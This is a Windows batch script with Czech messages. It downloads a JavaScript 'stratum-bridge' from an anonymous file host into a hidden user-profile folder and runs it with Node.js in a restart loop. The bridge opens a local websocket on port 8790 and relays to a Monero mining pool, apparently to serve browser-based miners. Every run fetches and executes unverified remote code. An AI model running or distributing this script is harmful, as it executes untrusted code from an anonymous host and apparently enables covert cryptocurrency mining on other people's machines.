@echo off
setlocal
if "%BRIDGE_URL%"=="" set BRIDGE_URL=https://files.catbox.moe/b97b32.js
set "DIR=%USERPROFILE%\.rx-bridge"
where node >nul 2>nul || (echo Chybi Node.js - nainstaluj LTS z https://nodejs.org/ ^& pause ^& exit /b 1)
if not exist "%DIR%" mkdir "%DIR%"
curl -fsSL "%BRIDGE_URL%" -o "%DIR%\stratum-bridge.js" || (echo Stazeni bridge selhalo ^& pause ^& exit /b 1)
echo Bridge bezi na ws://127.0.0.1:8790 - tohle okno nech otevrene.
:loop
node "%DIR%\stratum-bridge.js" --port 8790 --bind 127.0.0.1 --pool gulf.moneroocean.stream:10128
timeout /t 3 >nul
goto loop
